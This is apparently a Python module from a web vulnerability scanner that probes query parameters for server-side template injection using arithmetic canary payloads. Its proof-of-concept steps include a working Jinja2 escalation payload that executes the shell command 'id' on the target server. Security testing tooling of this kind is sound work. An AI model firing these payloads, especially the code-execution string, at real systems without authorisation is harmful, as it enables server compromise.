"""SSTI Scanner"""
from __future__ import annotations
import asyncio
from typing import List
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

# Use large-number multiplication to avoid false positives
# ("49" matches prices, dates, IDs etc. — "6375624792" is unique)
SSTI_PAYLOADS = [
    ("{{79831*79832}}", "6375624792"),
    ("${79831*79832}", "6375624792"),
    ("#{79831*79832}", "6375624792"),
    ("<%= 79831*79832 %>", "6375624792"),
    ("{{7*'7'}}", "7777777"),
    ("{79831*79832}", "6375624792"),
    ("@(79831*79832)", "6375624792"),
]

class SSTIScanner(BaseScanner):
    name = "ssti"
    description = "Detects Server-Side Template Injection"
    tags = ["injection", "ssti", "owasp-a03"]

    async def run(self, state: ScanState) -> List[Finding]:
        findings = []
        seen = set()  # (url, param) dedup
        tasks = [self._test(url, param, payload, expected)
                 for url, params in state.target.discovered_params.items()
                 for param in params
                 for payload, expected in SSTI_PAYLOADS]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for r in results:
            if isinstance(r, Finding):
                key = (r.url, r.parameter)
                if key not in seen:
                    seen.add(key)
                    findings.append(r)
        return findings

    async def _test(self, url, param, payload, expected):
        # Baseline: check if the canary already appears without injection
        baseline, _ = await self.test_payload(url, "GET", param, "harmless", inject_in="query")
        if baseline and expected in baseline.text:
            return None  # canary present naturally → skip
        resp, raw_req = await self.test_payload(url, "GET", param, payload, inject_in="query")
        if resp and expected in resp.text:
            return self.make_finding(
                title=f"SSTI in '{param}' — expression evaluated",
                vuln_type="ssti", severity=Severity.CRITICAL,
                url=url, parameter=param, payload=payload,
                evidence=f"Payload {payload!r} evaluated to {expected!r}",
                request=raw_req, response=resp.text[:300],
                cwe_id="CWE-94", owasp_category="A03:2021 - Injection",
                description=f"Template engine evaluates user input. Escalatable to RCE.",
                poc_steps=[f"1. GET {url}?{param}={payload}", f"2. Response contains '{expected}'",
                           "3. Escalate: {{config.__class__.__init__.__globals__['os'].popen('id').read()}}"],
            )
        return None
